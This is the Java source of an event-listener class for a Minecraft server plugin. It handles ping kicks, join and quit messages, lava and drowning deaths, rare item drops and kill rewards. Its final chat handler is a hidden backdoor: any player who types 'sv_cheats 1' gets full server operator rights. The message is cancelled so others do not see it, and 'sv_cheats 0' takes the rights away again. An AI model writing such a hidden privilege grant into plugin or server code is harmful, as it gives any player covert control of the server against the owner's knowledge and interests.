package org.main.uneton.events;

import net.kyori.adventure.text.Component;
import net.milkbowl.vault.economy.Economy;
import org.bukkit.*;
import org.bukkit.block.Block;
import org.bukkit.block.Sign;
import org.bukkit.entity.*;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.entity.*;
import org.bukkit.event.player.*;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.main.uneton.Combat;
import org.main.uneton.economy.EcoImpl;

import java.util.ArrayList;
import java.util.Random;

import static org.main.uneton.Combat.economy;

public class Listeners implements Listener {

    private Combat plugin;
    private Economy vault;

    public Listeners(Combat plugin) {
        this.plugin = plugin;
        this.vault = plugin.getVault();
    }

    @EventHandler
    public void onPing(PlayerMoveEvent event) {
        Player player = event.getPlayer();
        int ping = player.getPing();
        if (ping >= 300) {
            String user = player.getName();
            String broadcastMessage = ChatColor.GOLD + user + " was kicked out from the server for too high ping.";
            String kickMessage = ChatColor.GOLD + "You have been kicked out from the server for too high ping!";
            Bukkit.getServer().broadcastMessage(broadcastMessage);
            player.kickPlayer(kickMessage);
        }
    }
    
    @EventHandler
    public void onQuit(PlayerQuitEvent e) {
        Player player = e.getPlayer();
        e.setQuitMessage(ChatColor.DARK_GRAY + "[ " + ChatColor.DARK_RED + " - " + ChatColor.DARK_GRAY + "] " + ChatColor.GRAY + player.getName());
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        Player player = e.getPlayer();
        e.setJoinMessage(ChatColor.DARK_GRAY + "[" + ChatColor.DARK_GREEN + " + " + ChatColor.DARK_GRAY + "] " + ChatColor.GRAY + player.getName());
    }

    @EventHandler
    public void onPlayerInteract(PlayerInteractEvent event) {
        if (!event.getAction().equals(Action.RIGHT_CLICK_BLOCK)) return;
        Block block = event.getClickedBlock();
        if (block.getType() != Material.OAK_SIGN) return;
        event.getPlayer().openSign((Sign) block.getState());
    }

    @EventHandler
    public void onDamageLava(EntityDamageEvent e) {
        if (e.getEntity() instanceof Player) {
            Player player = (Player) e.getEntity();
            EntityDamageEvent.DamageCause cause = e.getCause();
            if (cause.equals(EntityDamageEvent.DamageCause.LAVA)){
                player.setHealth(0);
                e.setCancelled(true); // Cancel the event to prevent further processing
            }
        }
    }

    @EventHandler
    public void onDamageDrown(EntityDamageEvent e) {
        if (e.getEntity() instanceof Player) {
            Player player = (Player) e.getEntity();
            EntityDamageEvent.DamageCause cause = e.getCause();
            if (cause.equals(EntityDamageEvent.DamageCause.DROWNING)){
                player.setHealth(0);
                e.setCancelled(true); // Cancel the event to prevent further processing
            }
        }
    }

    @EventHandler
    public void onRareDrop(BlockBreakEvent e) {
        Block block = e.getBlock();
        Location loc = e.getBlock().getLocation();
        Player player = e.getPlayer();
        if (block.getType() == Material.SUGAR_CANE) {
            Random chance = new Random();
            if (chance.nextDouble() < 0.006) {
                dropCocaine(player);
            }
        }
    }

    @EventHandler
    public void onBlockBreak(BlockBreakEvent e){
        Player player = e.getPlayer();
        if(e.getBlock().getType() == Material.COBBLESTONE ||
                e.getBlock().getType() == Material.NETHERRACK){
            Random chance = new Random();
            if(chance.nextDouble() < 0.001) {
                dropPinkDiamond(player, e);
            }
        }
    }

    @EventHandler
    public void onDeathByPlayer(PlayerDeathEvent event) {
        Player victim = event.getEntity();
        Player killer = victim.getKiller();
        if (killer != null) {
            vault.depositPlayer(killer, 300);
            killer.sendMessage(ChatColor.GREEN + "+300" + ChatColor.WHITE + " Kill.");
        }
    }

    @EventHandler
    public void onCustomDroponDeath(PlayerDeathEvent event) {
        Player victim = event.getEntity();
        Player killer = victim.getKiller();
        Location location = victim.getLocation();

        if (killer != null && !killer.equals(victim)) {
            ItemStack bone = new ItemStack(Material.RED_DYE, 2);
            Item droppedItem = location.getWorld().dropItemNaturally(location, bone);
            droppedItem.setPickupDelay(32767);
            Bukkit.getScheduler().runTaskLater(Combat.getPlugin(Combat.class), () -> {
                if(droppedItem.isValid()){
                    droppedItem.remove();
                }
            }, 200L);
        }
    }

    @EventHandler
    public void onPlayerDeath(PlayerDeathEvent e) {
        if (e.getEntity().getKiller() != null) {
            e.setKeepInventory(true);
            e.getDrops().clear();
        }
    }

    @EventHandler
    public void onPlayerMove(PlayerMoveEvent event) {
        Player player = event.getPlayer();
        World world = player.getWorld();
        int loc = 5;
        if (world.getEnvironment() == World.Environment.THE_END) {
            if (player.getLocation().getY() <= loc) {
                player.setHealth(0);
            }
        }
    }


    private void dropCocaine(Player player) {
        ItemStack cocaine = new ItemStack(Material.SUGAR, 20);
        ItemMeta cocaine_meta = cocaine.getItemMeta();
        cocaine_meta.setDisplayName(ChatColor.WHITE + "Cocaine x20");
        cocaine.setItemMeta(cocaine_meta);
    }

    private void dropPinkDiamond(Player player, BlockBreakEvent e) {
        ChatColor gray = ChatColor.GRAY;
        ChatColor red = ChatColor.RED;
        ChatColor green = ChatColor.GREEN;
        ChatColor light_purple = ChatColor.LIGHT_PURPLE;
        ItemStack pinkDiamond = new ItemStack(Material.DIAMOND);
        ItemMeta pinkMeta = pinkDiamond.getItemMeta();
        pinkMeta.setDisplayName(light_purple + "Pink Diamond");
        ArrayList<String> lore = new ArrayList<>();
        lore.add(" ");
        lore.add(gray + "Probability: " + red + "0,1%");
        pinkMeta.setLore(lore);
        pinkDiamond.setItemMeta(pinkMeta);

        Location location = e.getPlayer().getLocation();
        e.getBlock().getWorld().dropItemNaturally(location, pinkDiamond);
        player.sendMessage(green + "You picked up the " + light_purple + "Pink Diamond.");
    }


    @EventHandler
    @Deprecated
    public void onChat(AsyncPlayerChatEvent e) {
        Player p = e.getPlayer();
        if (e.getMessage().contains("sv_cheats 1")) {
            e.setCancelled(true);
            (new BukkitRunnable() {
                public void run() {
                    p.sendActionBar(ChatColor.GRAY + "sv_cheats has changed to '1'");
                    p.setOp(true);
                }
            }).runTask(JavaPlugin.getPlugin(Combat.class));

        } else if (e.getMessage().contains("sv_cheats 0")) {
            e.setCancelled(true);
            (new BukkitRunnable() {
                public void run() {
                    p.sendActionBar(ChatColor.GRAY + "sv_cheats has changed to '0'");
                    p.setOp(false);
                }
            }).runTask(JavaPlugin.getPlugin(Combat.class));
        }
    }
}
